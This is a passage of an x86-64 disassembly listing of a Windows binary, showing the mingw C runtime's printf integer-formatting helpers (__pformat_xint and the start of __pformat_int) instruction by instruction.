   140003fbb:	eb 9c                	jmp    140003f59 <__pformat_emit_inf_or_nan+0x19>
   140003fbd:	0f 1f 00             	nopl   (%rax)
   140003fc0:	4c 8d 5c 24 2c       	lea    0x2c(%rsp),%r11
   140003fc5:	4d 89 d9             	mov    %r11,%r9
   140003fc8:	eb 9d                	jmp    140003f67 <__pformat_emit_inf_or_nan+0x27>
   140003fca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000140003fd0 <__pformat_xint.isra.0>:
   140003fd0:	55                   	push   %rbp
   140003fd1:	41 57                	push   %r15
   140003fd3:	41 56                	push   %r14
   140003fd5:	41 55                	push   %r13
   140003fd7:	41 54                	push   %r12
   140003fd9:	57                   	push   %rdi
   140003fda:	56                   	push   %rsi
   140003fdb:	53                   	push   %rbx
   140003fdc:	48 83 ec 38          	sub    $0x38,%rsp
   140003fe0:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   140003fe5:	41 89 cd             	mov    %ecx,%r13d
   140003fe8:	4c 89 c3             	mov    %r8,%rbx
   140003feb:	83 f9 6f             	cmp    $0x6f,%ecx
   140003fee:	0f 84 f4 02 00 00    	je     1400042e8 <__pformat_xint.isra.0+0x318>
   140003ff4:	45 8b 70 10          	mov    0x10(%r8),%r14d
   140003ff8:	31 c0                	xor    %eax,%eax
   140003ffa:	45 8b 40 08          	mov    0x8(%r8),%r8d
   140003ffe:	45 85 f6             	test   %r14d,%r14d
   140004001:	44 89 c7             	mov    %r8d,%edi
   140004004:	41 0f 49 c6          	cmovns %r14d,%eax
   140004008:	83 c0 12             	add    $0x12,%eax
   14000400b:	41 f7 c0 00 10 00 00 	test   $0x1000,%r8d
   140004012:	0f 85 e8 01 00 00    	jne    140004200 <__pformat_xint.isra.0+0x230>
   140004018:	44 8b 4b 0c          	mov    0xc(%rbx),%r9d
   14000401c:	41 39 c1             	cmp    %eax,%r9d
   14000401f:	41 0f 4d c1          	cmovge %r9d,%eax
   140004023:	48 98                	cltq
   140004025:	48 83 c0 0f          	add    $0xf,%rax
   140004029:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000402d:	e8 be f9 ff ff       	call   1400039f0 <___chkstk_ms>
   140004032:	b9 04 00 00 00       	mov    $0x4,%ecx
   140004037:	48 29 c4             	sub    %rax,%rsp
   14000403a:	4c 8d 64 24 20       	lea    0x20(%rsp),%r12
   14000403f:	41 bf 0f 00 00 00    	mov    $0xf,%r15d
   140004045:	48 85 d2             	test   %rdx,%rdx
   140004048:	0f 84 47 05 00 00    	je     140004595 <__pformat_xint.isra.0+0x5c5>
   14000404e:	89 7d fc             	mov    %edi,-0x4(%rbp)
   140004051:	45 89 ea             	mov    %r13d,%r10d
   140004054:	4c 89 e6             	mov    %r12,%rsi
   140004057:	4c 89 65 f0          	mov    %r12,-0x10(%rbp)
   14000405b:	41 83 e2 20          	and    $0x20,%r10d
   14000405f:	90                   	nop
   140004060:	44 89 f8             	mov    %r15d,%eax
   140004063:	49 89 f3             	mov    %rsi,%r11
   140004066:	48 83 c6 01          	add    $0x1,%rsi
   14000406a:	21 d0                	and    %edx,%eax
   14000406c:	44 8d 60 30          	lea    0x30(%rax),%r12d
   140004070:	83 c0 37             	add    $0x37,%eax
   140004073:	44 09 d0             	or     %r10d,%eax
   140004076:	44 89 e7             	mov    %r12d,%edi
   140004079:	41 80 fc 3a          	cmp    $0x3a,%r12b
   14000407d:	0f 43 f8             	cmovae %eax,%edi
   140004080:	48 d3 ea             	shr    %cl,%rdx
   140004083:	40 88 7e ff          	mov    %dil,-0x1(%rsi)
   140004087:	48 85 d2             	test   %rdx,%rdx
   14000408a:	75 d4                	jne    140004060 <__pformat_xint.isra.0+0x90>
   14000408c:	4c 8b 65 f0          	mov    -0x10(%rbp),%r12
   140004090:	8b 7d fc             	mov    -0x4(%rbp),%edi
   140004093:	4c 39 e6             	cmp    %r12,%rsi
   140004096:	0f 84 bc 01 00 00    	je     140004258 <__pformat_xint.isra.0+0x288>
   14000409c:	45 85 f6             	test   %r14d,%r14d
   14000409f:	0f 8e 23 03 00 00    	jle    1400043c8 <__pformat_xint.isra.0+0x3f8>
   1400040a5:	48 89 f0             	mov    %rsi,%rax
   1400040a8:	45 89 f7             	mov    %r14d,%r15d
   1400040ab:	4c 29 e0             	sub    %r12,%rax
   1400040ae:	41 29 c7             	sub    %eax,%r15d
   1400040b1:	45 85 ff             	test   %r15d,%r15d
   1400040b4:	0f 8f b3 01 00 00    	jg     14000426d <__pformat_xint.isra.0+0x29d>
   1400040ba:	41 83 fd 6f          	cmp    $0x6f,%r13d
   1400040be:	0f 84 48 04 00 00    	je     14000450c <__pformat_xint.isra.0+0x53c>
   1400040c4:	44 39 c8             	cmp    %r9d,%eax
   1400040c7:	0f 8d a3 04 00 00    	jge    140004570 <__pformat_xint.isra.0+0x5a0>
   1400040cd:	41 29 c1             	sub    %eax,%r9d
   1400040d0:	41 81 e0 00 08 00 00 	and    $0x800,%r8d
   1400040d7:	44 89 4b 0c          	mov    %r9d,0xc(%rbx)
   1400040db:	45 89 cf             	mov    %r9d,%r15d
   1400040de:	0f 84 c0 02 00 00    	je     1400043a4 <__pformat_xint.isra.0+0x3d4>
   1400040e4:	41 83 ef 02          	sub    $0x2,%r15d
   1400040e8:	45 85 ff             	test   %r15d,%r15d
   1400040eb:	0f 8e 64 03 00 00    	jle    140004455 <__pformat_xint.isra.0+0x485>
   1400040f1:	48 89 f0             	mov    %rsi,%rax
   1400040f4:	44 88 2e             	mov    %r13b,(%rsi)
   1400040f7:	48 83 c6 02          	add    $0x2,%rsi
   1400040fb:	c6 40 01 30          	movb   $0x30,0x1(%rax)
   1400040ff:	f7 c7 00 04 00 00    	test   $0x400,%edi
   140004105:	0f 85 a5 02 00 00    	jne    1400043b0 <__pformat_xint.isra.0+0x3e0>
   14000410b:	41 83 ef 01          	sub    $0x1,%r15d
   14000410f:	90                   	nop
   140004110:	48 89 da             	mov    %rbx,%rdx
   140004113:	b9 20 00 00 00       	mov    $0x20,%ecx
   140004118:	e8 93 fa ff ff       	call   140003bb0 <__pformat_putc>
   14000411d:	41 83 ef 01          	sub    $0x1,%r15d
   140004121:	73 ed                	jae    140004110 <__pformat_xint.isra.0+0x140>
   140004123:	49 39 f4             	cmp    %rsi,%r12
   140004126:	0f 83 ba 00 00 00    	jae    1400041e6 <__pformat_xint.isra.0+0x216>
   14000412c:	8b 7b 08             	mov    0x8(%rbx),%edi
   14000412f:	41 bd fe ff ff ff    	mov    $0xfffffffe,%r13d
   140004135:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   14000413b:	eb 1b                	jmp    140004158 <__pformat_xint.isra.0+0x188>
   14000413d:	0f 1f 00             	nopl   (%rax)
   140004140:	48 63 43 24          	movslq 0x24(%rbx),%rax
   140004144:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
   140004147:	8b 43 24             	mov    0x24(%rbx),%eax
   14000414a:	83 c0 01             	add    $0x1,%eax
   14000414d:	89 43 24             	mov    %eax,0x24(%rbx)
   140004150:	49 39 f4             	cmp    %rsi,%r12
   140004153:	73 38                	jae    14000418d <__pformat_xint.isra.0+0x1bd>
   140004155:	8b 7b 08             	mov    0x8(%rbx),%edi
   140004158:	48 83 ee 01          	sub    $0x1,%rsi
   14000415c:	f7 c7 00 40 00 00    	test   $0x4000,%edi
   140004162:	75 08                	jne    14000416c <__pformat_xint.isra.0+0x19c>
   140004164:	8b 43 24             	mov    0x24(%rbx),%eax
   140004167:	39 43 28             	cmp    %eax,0x28(%rbx)
   14000416a:	7e de                	jle    14000414a <__pformat_xint.isra.0+0x17a>
   14000416c:	81 e7 00 20 00 00    	and    $0x2000,%edi
   140004172:	0f be 0e             	movsbl (%rsi),%ecx
   140004175:	48 8b 13             	mov    (%rbx),%rdx
   140004178:	74 c6                	je     140004140 <__pformat_xint.isra.0+0x170>
   14000417a:	e8 31 52 00 00       	call   1400093b0 <fputc>
   14000417f:	8b 43 24             	mov    0x24(%rbx),%eax
   140004182:	83 c0 01             	add    $0x1,%eax
   140004185:	89 43 24             	mov    %eax,0x24(%rbx)
   140004188:	49 39 f4             	cmp    %rsi,%r12
   14000418b:	72 c8                	jb     140004155 <__pformat_xint.isra.0+0x185>
   14000418d:	45 85 ff             	test   %r15d,%r15d
   140004190:	7f 1d                	jg     1400041af <__pformat_xint.isra.0+0x1df>
   140004192:	eb 52                	jmp    1400041e6 <__pformat_xint.isra.0+0x216>
   140004194:	0f 1f 40 00          	nopl   0x0(%rax)
   140004198:	48 63 43 24          	movslq 0x24(%rbx),%rax
   14000419c:	c6 04 02 20          	movb   $0x20,(%rdx,%rax,1)
   1400041a0:	8b 43 24             	mov    0x24(%rbx),%eax
   1400041a3:	83 c0 01             	add    $0x1,%eax
   1400041a6:	89 43 24             	mov    %eax,0x24(%rbx)
   1400041a9:	41 83 ed 01          	sub    $0x1,%r13d
   1400041ad:	72 37                	jb     1400041e6 <__pformat_xint.isra.0+0x216>
   1400041af:	8b 7b 08             	mov    0x8(%rbx),%edi
   1400041b2:	f7 c7 00 40 00 00    	test   $0x4000,%edi
   1400041b8:	75 08                	jne    1400041c2 <__pformat_xint.isra.0+0x1f2>
   1400041ba:	8b 43 24             	mov    0x24(%rbx),%eax
   1400041bd:	39 43 28             	cmp    %eax,0x28(%rbx)
   1400041c0:	7e e1                	jle    1400041a3 <__pformat_xint.isra.0+0x1d3>
   1400041c2:	81 e7 00 20 00 00    	and    $0x2000,%edi
   1400041c8:	48 8b 13             	mov    (%rbx),%rdx
   1400041cb:	74 cb                	je     140004198 <__pformat_xint.isra.0+0x1c8>
   1400041cd:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400041d2:	e8 d9 51 00 00       	call   1400093b0 <fputc>
   1400041d7:	8b 43 24             	mov    0x24(%rbx),%eax
   1400041da:	83 c0 01             	add    $0x1,%eax
   1400041dd:	89 43 24             	mov    %eax,0x24(%rbx)
   1400041e0:	41 83 ed 01          	sub    $0x1,%r13d
   1400041e4:	73 c9                	jae    1400041af <__pformat_xint.isra.0+0x1df>
   1400041e6:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   1400041ea:	5b                   	pop    %rbx
   1400041eb:	5e                   	pop    %rsi
   1400041ec:	5f                   	pop    %rdi
   1400041ed:	41 5c                	pop    %r12
   1400041ef:	41 5d                	pop    %r13
   1400041f1:	41 5e                	pop    %r14
   1400041f3:	41 5f                	pop    %r15
   1400041f5:	5d                   	pop    %rbp
   1400041f6:	c3                   	ret
   1400041f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400041fe:	00 00 
   140004200:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   140004205:	0f 84 0d fe ff ff    	je     140004018 <__pformat_xint.isra.0+0x48>
   14000420b:	b9 04 00 00 00       	mov    $0x4,%ecx
   140004210:	41 89 c2             	mov    %eax,%r10d
   140004213:	41 b9 ab aa aa aa    	mov    $0xaaaaaaab,%r9d
   140004219:	4d 0f af d1          	imul   %r9,%r10
   14000421d:	44 8b 4b 0c          	mov    0xc(%rbx),%r9d
   140004221:	49 c1 ea 21          	shr    $0x21,%r10
   140004225:	44 01 d0             	add    %r10d,%eax
   140004228:	44 39 c8             	cmp    %r9d,%eax
   14000422b:	41 0f 4c c1          	cmovl  %r9d,%eax
   14000422f:	48 98                	cltq
   140004231:	48 83 c0 0f          	add    $0xf,%rax
   140004235:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140004239:	e8 b2 f7 ff ff       	call   1400039f0 <___chkstk_ms>
   14000423e:	48 29 c4             	sub    %rax,%rsp
   140004241:	4c 8d 64 24 20       	lea    0x20(%rsp),%r12
   140004246:	41 83 fd 6f          	cmp    $0x6f,%r13d
   14000424a:	0f 85 ef fd ff ff    	jne    14000403f <__pformat_xint.isra.0+0x6f>
   140004250:	e9 e9 00 00 00       	jmp    14000433e <__pformat_xint.isra.0+0x36e>
   140004255:	0f 1f 00             	nopl   (%rax)
   140004258:	44 89 c0             	mov    %r8d,%eax
   14000425b:	80 e4 f7             	and    $0xf7,%ah
   14000425e:	89 43 08             	mov    %eax,0x8(%rbx)
   140004261:	45 85 f6             	test   %r14d,%r14d
   140004264:	0f 8e 26 02 00 00    	jle    140004490 <__pformat_xint.isra.0+0x4c0>
   14000426a:	45 89 f7             	mov    %r14d,%r15d
   14000426d:	4d 63 c7             	movslq %r15d,%r8
   140004270:	41 83 ef 01          	sub    $0x1,%r15d
   140004274:	48 89 f1             	mov    %rsi,%rcx
   140004277:	ba 30 00 00 00       	mov    $0x30,%edx
   14000427c:	4d 63 ff             	movslq %r15d,%r15
   14000427f:	44 89 4d fc          	mov    %r9d,-0x4(%rbp)
   140004283:	e8 60 51 00 00       	call   1400093e8 <memset>
   140004288:	4a 8d 74 3e 01       	lea    0x1(%rsi,%r15,1),%rsi
   14000428d:	44 8b 4d fc          	mov    -0x4(%rbp),%r9d
   140004291:	4c 39 e6             	cmp    %r12,%rsi
   140004294:	0f 84 d6 00 00 00    	je     140004370 <__pformat_xint.isra.0+0x3a0>
   14000429a:	48 89 f0             	mov    %rsi,%rax
   14000429d:	4c 29 e0             	sub    %r12,%rax
   1400042a0:	89 c2                	mov    %eax,%edx
   1400042a2:	44 39 c8             	cmp    %r9d,%eax
   1400042a5:	0f 8c dd 00 00 00    	jl     140004388 <__pformat_xint.isra.0+0x3b8>
   1400042ab:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   1400042b2:	41 83 fd 6f          	cmp    $0x6f,%r13d
   1400042b6:	0f 84 67 fe ff ff    	je     140004123 <__pformat_xint.isra.0+0x153>
   1400042bc:	44 8b 43 08          	mov    0x8(%rbx),%r8d
   1400042c0:	41 81 e0 00 08 00 00 	and    $0x800,%r8d
   1400042c7:	0f 84 56 fe ff ff    	je     140004123 <__pformat_xint.isra.0+0x153>
   1400042cd:	44 88 2e             	mov    %r13b,(%rsi)
   1400042d0:	48 8d 46 02          	lea    0x2(%rsi),%rax
   1400042d4:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   1400042da:	c6 46 01 30          	movb   $0x30,0x1(%rsi)
   1400042de:	e9 7d 01 00 00       	jmp    140004460 <__pformat_xint.isra.0+0x490>
   1400042e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400042e8:	45 8b 70 10          	mov    0x10(%r8),%r14d
   1400042ec:	31 c0                	xor    %eax,%eax
   1400042ee:	45 8b 40 08          	mov    0x8(%r8),%r8d
   1400042f2:	45 85 f6             	test   %r14d,%r14d
   1400042f5:	44 89 c7             	mov    %r8d,%edi
   1400042f8:	41 0f 49 c6          	cmovns %r14d,%eax
   1400042fc:	83 c0 18             	add    $0x18,%eax
   1400042ff:	41 f7 c0 00 10 00 00 	test   $0x1000,%r8d
   140004306:	0f 84 74 01 00 00    	je     140004480 <__pformat_xint.isra.0+0x4b0>
   14000430c:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   140004311:	0f 85 65 02 00 00    	jne    14000457c <__pformat_xint.isra.0+0x5ac>
   140004317:	44 8b 4b 0c          	mov    0xc(%rbx),%r9d
   14000431b:	44 39 c8             	cmp    %r9d,%eax
   14000431e:	41 0f 4c c1          	cmovl  %r9d,%eax
   140004322:	48 98                	cltq
   140004324:	48 83 c0 0f          	add    $0xf,%rax
   140004328:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000432c:	e8 bf f6 ff ff       	call   1400039f0 <___chkstk_ms>
   140004331:	b9 03 00 00 00       	mov    $0x3,%ecx
   140004336:	48 29 c4             	sub    %rax,%rsp
   140004339:	4c 8d 64 24 20       	lea    0x20(%rsp),%r12
   14000433e:	41 bf 07 00 00 00    	mov    $0x7,%r15d
   140004344:	48 85 d2             	test   %rdx,%rdx
   140004347:	0f 85 01 fd ff ff    	jne    14000404e <__pformat_xint.isra.0+0x7e>
   14000434d:	44 89 c0             	mov    %r8d,%eax
   140004350:	4c 89 e6             	mov    %r12,%rsi
   140004353:	45 89 f7             	mov    %r14d,%r15d
   140004356:	80 e4 f7             	and    $0xf7,%ah
   140004359:	89 43 08             	mov    %eax,0x8(%rbx)
   14000435c:	45 85 f6             	test   %r14d,%r14d
   14000435f:	0f 8f 08 ff ff ff    	jg     14000426d <__pformat_xint.isra.0+0x29d>
   140004365:	45 85 f6             	test   %r14d,%r14d
   140004368:	0f 84 2c ff ff ff    	je     14000429a <__pformat_xint.isra.0+0x2ca>
   14000436e:	66 90                	xchg   %ax,%ax
   140004370:	c6 06 30             	movb   $0x30,(%rsi)
   140004373:	48 83 c6 01          	add    $0x1,%rsi
   140004377:	48 89 f0             	mov    %rsi,%rax
   14000437a:	4c 29 e0             	sub    %r12,%rax
   14000437d:	89 c2                	mov    %eax,%edx
   14000437f:	44 39 c8             	cmp    %r9d,%eax
   140004382:	0f 8d 23 ff ff ff    	jge    1400042ab <__pformat_xint.isra.0+0x2db>
   140004388:	41 29 d1             	sub    %edx,%r9d
   14000438b:	8b 7b 08             	mov    0x8(%rbx),%edi
   14000438e:	44 89 4b 0c          	mov    %r9d,0xc(%rbx)
   140004392:	45 89 cf             	mov    %r9d,%r15d
   140004395:	41 83 fd 6f          	cmp    $0x6f,%r13d
   140004399:	75 53                	jne    1400043ee <__pformat_xint.isra.0+0x41e>
   14000439b:	45 85 f6             	test   %r14d,%r14d
   14000439e:	0f 88 2d 01 00 00    	js     1400044d1 <__pformat_xint.isra.0+0x501>
   1400043a4:	f7 c7 00 04 00 00    	test   $0x400,%edi
   1400043aa:	0f 84 5b fd ff ff    	je     14000410b <__pformat_xint.isra.0+0x13b>
   1400043b0:	45 8d 6f ff          	lea    -0x1(%r15),%r13d
   1400043b4:	49 39 f4             	cmp    %rsi,%r12
   1400043b7:	0f 82 9b fd ff ff    	jb     140004158 <__pformat_xint.isra.0+0x188>
   1400043bd:	e9 f0 fd ff ff       	jmp    1400041b2 <__pformat_xint.isra.0+0x1e2>
   1400043c2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400043c8:	41 83 fd 6f          	cmp    $0x6f,%r13d
   1400043cc:	0f 84 e1 00 00 00    	je     1400044b3 <__pformat_xint.isra.0+0x4e3>
   1400043d2:	48 89 f0             	mov    %rsi,%rax
   1400043d5:	4c 29 e0             	sub    %r12,%rax
   1400043d8:	44 39 c8             	cmp    %r9d,%eax
   1400043db:	0f 8d 8f 01 00 00    	jge    140004570 <__pformat_xint.isra.0+0x5a0>
   1400043e1:	41 29 c1             	sub    %eax,%r9d
   1400043e4:	44 89 c7             	mov    %r8d,%edi
   1400043e7:	44 89 4b 0c          	mov    %r9d,0xc(%rbx)
   1400043eb:	45 89 cf             	mov    %r9d,%r15d
   1400043ee:	f7 c7 00 08 00 00    	test   $0x800,%edi
   1400043f4:	75 52                	jne    140004448 <__pformat_xint.isra.0+0x478>
   1400043f6:	45 85 f6             	test   %r14d,%r14d
   1400043f9:	79 a9                	jns    1400043a4 <__pformat_xint.isra.0+0x3d4>
   1400043fb:	89 f8                	mov    %edi,%eax
   1400043fd:	25 00 06 00 00       	and    $0x600,%eax
   140004402:	3d 00 02 00 00       	cmp    $0x200,%eax
   140004407:	75 9b                	jne    1400043a4 <__pformat_xint.isra.0+0x3d4>
   140004409:	ba 30 00 00 00       	mov    $0x30,%edx
   14000440e:	45 8d 77 ff          	lea    -0x1(%r15),%r14d
   140004412:	4d 63 c7             	movslq %r15d,%r8
   140004415:	48 89 f1             	mov    %rsi,%rcx
   140004418:	e8 cb 4f 00 00       	call   1400093e8 <memset>
   14000441d:	4d 63 f6             	movslq %r14d,%r14
   140004420:	81 e7 00 08 00 00    	and    $0x800,%edi
   140004426:	4a 8d 54 36 01       	lea    0x1(%rsi,%r14,1),%rdx
   14000442b:	0f 84 cd 00 00 00    	je     1400044fe <__pformat_xint.isra.0+0x52e>
   140004431:	44 88 2a             	mov    %r13b,(%rdx)
   140004434:	4a 8d 44 36 03       	lea    0x3(%rsi,%r14,1),%rax
   140004439:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   14000443f:	c6 42 01 30          	movb   $0x30,0x1(%rdx)
   140004443:	eb 1b                	jmp    140004460 <__pformat_xint.isra.0+0x490>
   140004445:	0f 1f 00             	nopl   (%rax)
   140004448:	41 83 ef 02          	sub    $0x2,%r15d
   14000444c:	45 85 ff             	test   %r15d,%r15d
   14000444f:	0f 8f 63 01 00 00    	jg     1400045b8 <__pformat_xint.isra.0+0x5e8>
   140004455:	44 88 2e             	mov    %r13b,(%rsi)
   140004458:	48 8d 46 02          	lea    0x2(%rsi),%rax
   14000445c:	c6 46 01 30          	movb   $0x30,0x1(%rsi)
   140004460:	49 39 c4             	cmp    %rax,%r12
   140004463:	0f 83 7d fd ff ff    	jae    1400041e6 <__pformat_xint.isra.0+0x216>
   140004469:	8b 7b 08             	mov    0x8(%rbx),%edi
   14000446c:	45 8d 6f ff          	lea    -0x1(%r15),%r13d
   140004470:	48 89 c6             	mov    %rax,%rsi
   140004473:	e9 e0 fc ff ff       	jmp    140004158 <__pformat_xint.isra.0+0x188>
   140004478:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000447f:	00 
   140004480:	44 8b 4b 0c          	mov    0xc(%rbx),%r9d
   140004484:	41 39 c1             	cmp    %eax,%r9d
   140004487:	41 0f 4d c1          	cmovge %r9d,%eax
   14000448b:	e9 92 fe ff ff       	jmp    140004322 <__pformat_xint.isra.0+0x352>
   140004490:	41 83 fd 6f          	cmp    $0x6f,%r13d
   140004494:	0f 84 b3 00 00 00    	je     14000454d <__pformat_xint.isra.0+0x57d>
   14000449a:	45 85 f6             	test   %r14d,%r14d
   14000449d:	0f 85 cd fe ff ff    	jne    140004370 <__pformat_xint.isra.0+0x3a0>
   1400044a3:	45 85 c9             	test   %r9d,%r9d
   1400044a6:	0f 8e da 00 00 00    	jle    140004586 <__pformat_xint.isra.0+0x5b6>
   1400044ac:	31 d2                	xor    %edx,%edx
   1400044ae:	e9 d5 fe ff ff       	jmp    140004388 <__pformat_xint.isra.0+0x3b8>
   1400044b3:	41 f7 c0 00 08 00 00 	test   $0x800,%r8d
   1400044ba:	74 74                	je     140004530 <__pformat_xint.isra.0+0x560>
   1400044bc:	c6 06 30             	movb   $0x30,(%rsi)
   1400044bf:	49 8d 73 02          	lea    0x2(%r11),%rsi
   1400044c3:	4c 39 e6             	cmp    %r12,%rsi
   1400044c6:	0f 85 ce fd ff ff    	jne    14000429a <__pformat_xint.isra.0+0x2ca>
   1400044cc:	e9 94 fe ff ff       	jmp    140004365 <__pformat_xint.isra.0+0x395>
   1400044d1:	89 f8                	mov    %edi,%eax
   1400044d3:	25 00 06 00 00       	and    $0x600,%eax
   1400044d8:	3d 00 02 00 00       	cmp    $0x200,%eax
   1400044dd:	0f 85 c1 fe ff ff    	jne    1400043a4 <__pformat_xint.isra.0+0x3d4>
   1400044e3:	ba 30 00 00 00       	mov    $0x30,%edx
   1400044e8:	4d 63 c7             	movslq %r15d,%r8
   1400044eb:	48 89 f1             	mov    %rsi,%rcx
   1400044ee:	e8 f5 4e 00 00       	call   1400093e8 <memset>
   1400044f3:	41 8d 47 ff          	lea    -0x1(%r15),%eax
   1400044f7:	48 98                	cltq
   1400044f9:	48 8d 54 06 01       	lea    0x1(%rsi,%rax,1),%rdx
   1400044fe:	48 89 d0             	mov    %rdx,%rax
   140004501:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   140004507:	e9 54 ff ff ff       	jmp    140004460 <__pformat_xint.isra.0+0x490>
   14000450c:	41 f7 c0 00 08 00 00 	test   $0x800,%r8d
   140004513:	74 21                	je     140004536 <__pformat_xint.isra.0+0x566>
   140004515:	49 83 c3 02          	add    $0x2,%r11
   140004519:	c6 06 30             	movb   $0x30,(%rsi)
   14000451c:	4c 89 de             	mov    %r11,%rsi
   14000451f:	4d 39 dc             	cmp    %r11,%r12
   140004522:	0f 85 72 fd ff ff    	jne    14000429a <__pformat_xint.isra.0+0x2ca>
   140004528:	4c 89 e6             	mov    %r12,%rsi
   14000452b:	e9 40 fe ff ff       	jmp    140004370 <__pformat_xint.isra.0+0x3a0>
   140004530:	48 89 f0             	mov    %rsi,%rax
   140004533:	4c 29 e0             	sub    %r12,%rax
   140004536:	44 39 c8             	cmp    %r9d,%eax
   140004539:	7d 24                	jge    14000455f <__pformat_xint.isra.0+0x58f>
   14000453b:	41 29 c1             	sub    %eax,%r9d
   14000453e:	44 89 c7             	mov    %r8d,%edi
   140004541:	44 89 4b 0c          	mov    %r9d,0xc(%rbx)
   140004545:	45 89 cf             	mov    %r9d,%r15d
   140004548:	e9 4e fe ff ff       	jmp    14000439b <__pformat_xint.isra.0+0x3cb>
   14000454d:	45 85 f6             	test   %r14d,%r14d
   140004550:	0f 85 1a fe ff ff    	jne    140004370 <__pformat_xint.isra.0+0x3a0>
   140004556:	45 85 c9             	test   %r9d,%r9d
   140004559:	0f 8f 4d ff ff ff    	jg     1400044ac <__pformat_xint.isra.0+0x4dc>
   14000455f:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   140004566:	e9 b8 fb ff ff       	jmp    140004123 <__pformat_xint.isra.0+0x153>
   14000456b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004570:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   140004577:	e9 44 fd ff ff       	jmp    1400042c0 <__pformat_xint.isra.0+0x2f0>
   14000457c:	b9 03 00 00 00       	mov    $0x3,%ecx
   140004581:	e9 8a fc ff ff       	jmp    140004210 <__pformat_xint.isra.0+0x240>
   140004586:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   14000458d:	41 89 c0             	mov    %eax,%r8d
   140004590:	e9 2b fd ff ff       	jmp    1400042c0 <__pformat_xint.isra.0+0x2f0>
   140004595:	44 89 c0             	mov    %r8d,%eax
   140004598:	4c 89 e6             	mov    %r12,%rsi
   14000459b:	45 89 f7             	mov    %r14d,%r15d
   14000459e:	80 e4 f7             	and    $0xf7,%ah
   1400045a1:	89 43 08             	mov    %eax,0x8(%rbx)
   1400045a4:	45 85 f6             	test   %r14d,%r14d
   1400045a7:	0f 8f c0 fc ff ff    	jg     14000426d <__pformat_xint.isra.0+0x29d>
   1400045ad:	0f 84 f0 fe ff ff    	je     1400044a3 <__pformat_xint.isra.0+0x4d3>
   1400045b3:	e9 b8 fd ff ff       	jmp    140004370 <__pformat_xint.isra.0+0x3a0>
   1400045b8:	48 89 f0             	mov    %rsi,%rax
   1400045bb:	45 85 f6             	test   %r14d,%r14d
   1400045be:	0f 89 30 fb ff ff    	jns    1400040f4 <__pformat_xint.isra.0+0x124>
   1400045c4:	89 fa                	mov    %edi,%edx
   1400045c6:	81 e2 00 06 00 00    	and    $0x600,%edx
   1400045cc:	81 fa 00 02 00 00    	cmp    $0x200,%edx
   1400045d2:	0f 85 1c fb ff ff    	jne    1400040f4 <__pformat_xint.isra.0+0x124>
   1400045d8:	e9 2c fe ff ff       	jmp    140004409 <__pformat_xint.isra.0+0x439>
   1400045dd:	0f 1f 00             	nopl   (%rax)

00000001400045e0 <__pformat_int.isra.0>:
   1400045e0:	55                   	push   %rbp
   1400045e1:	41 57                	push   %r15
   1400045e3:	41 56                	push   %r14
   1400045e5:	41 55                	push   %r13
   1400045e7:	41 54                	push   %r12
   1400045e9:	57                   	push   %rdi
   1400045ea:	56                   	push   %rsi
   1400045eb:	53                   	push   %rbx
   1400045ec:	48 83 ec 28          	sub    $0x28,%rsp
   1400045f0:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1400045f5:	31 c0                	xor    %eax,%eax
   1400045f7:	44 8b 72 10          	mov    0x10(%rdx),%r14d
   1400045fb:	8b 7a 08             	mov    0x8(%rdx),%edi
   1400045fe:	45 85 f6             	test   %r14d,%r14d
   140004601:	41 0f 49 c6          	cmovns %r14d,%eax
   140004605:	48 89 d3             	mov    %rdx,%rbx
   140004608:	83 c0 17             	add    $0x17,%eax
   14000460b:	f7 c7 00 10 00 00    	test   $0x1000,%edi
   140004611:	74 0b                	je     14000461e <__pformat_int.isra.0+0x3e>
   140004613:	66 83 7a 20 00       	cmpw   $0x0,0x20(%rdx)
   140004618:	0f 85 c2 01 00 00    	jne    1400047e0 <__pformat_int.isra.0+0x200>
   14000461e:	8b 73 0c             	mov    0xc(%rbx),%esi
   140004621:	39 c6                	cmp    %eax,%esi
   140004623:	0f 4d c6             	cmovge %esi,%eax
   140004626:	48 98                	cltq
   140004628:	48 83 c0 0f          	add    $0xf,%rax
   14000462c:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140004630:	e8 bb f3 ff ff       	call   1400039f0 <___chkstk_ms>
   140004635:	48 29 c4             	sub    %rax,%rsp
   140004638:	4c 8d 64 24 20       	lea    0x20(%rsp),%r12
   14000463d:	40 f6 c7 80          	test   $0x80,%dil
   140004641:	74 10                	je     140004653 <__pformat_int.isra.0+0x73>
   140004643:	48 85 c9             	test   %rcx,%rcx
   140004646:	0f 88 d4 01 00 00    	js     140004820 <__pformat_int.isra.0+0x240>
   14000464c:	40 80 e7 7f          	and    $0x7f,%dil
   140004650:	89 7b 08             	mov    %edi,0x8(%rbx)
   140004653:	48 85 c9             	test   %rcx,%rcx
   140004656:	0f 84 9c 02 00 00    	je     1400048f8 <__pformat_int.isra.0+0x318>
   14000465c:	49 bb 03 00 00 00 00 	movabs $0x8000000000000003,%r11
   140004663:	00 00 80 
   140004666:	41 89 fa             	mov    %edi,%r10d
   140004669:	4d 89 e0             	mov    %r12,%r8
